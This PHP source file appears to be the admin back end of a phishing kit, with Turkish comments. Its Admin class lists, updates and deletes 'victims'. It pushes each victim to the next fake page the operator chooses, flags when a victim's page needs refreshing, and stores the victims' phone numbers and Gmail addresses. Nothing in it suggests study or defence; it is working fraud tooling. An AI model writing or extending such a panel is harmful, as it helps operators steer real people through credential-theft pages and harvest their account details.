<?php

class Admin
{
    private $db;
    private $crud;

    function __construct($conn, $crud)
    {
        $this->db = $conn; 
        $this->crud = $crud; 
    }

    public function getAllVictims()
    {
        return $this->crud->getAllVictims();
    }

    public function getVictim($id)
    {
        return $this->crud->getVictim($id);
    }
    
public function updateVictim($id, $request)
{
    $victim = $this->crud->getVictim($id);

    // Is victim exists in database?
    if (empty($victim)) {
        return 0;
    }

    $currentPage = isset($request['currentpage']) ? trim($request['currentpage']) : '';

    // Güncellenecek alanları topla
    $updates = [
        'next_page'  => $currentPage,
        'is_waiting' => 0
    ];

    // Kurban zaten hedef sayfadaysa yenileme isteği gönder
    if (
        isset($victim['current_page'], $victim['next_page']) &&
        $victim['current_page'] == $currentPage &&
        $victim['next_page'] == $currentPage
    ) {
        $updates['is_refreshed'] = 1;
    }

    // Gelen alanlara göre ekle (varsa)
    if (isset($request['phonenum'])) {
        $updates['phonenum'] = trim($request['phonenum']);
    }

    if (isset($request['gmail'])) {
        $updates['gmail'] = trim($request['gmail']);
    }

    // Tek seferde güncelle
    $this->crud->updateVictim($id, $updates);

    return 1;
}


    public function deleteVictim($id)
    {
        $victim = $this->crud->getVictim($id);

        //Is victim exists in database?
        if(empty($victim)) {
            return;
        }

        return $this->crud->deleteVictim($id);
    }

    public function resetAll()
    {
        if ($this->crud->deleteAllVictims() !== true) {
            return 0;
        }

        if ($this->crud->countVictims() > 0) {
            return 0;
        }

        require_once dirname(__DIR__) . '/visits.php';
        clear_visits();

        return 1;
    }
    

}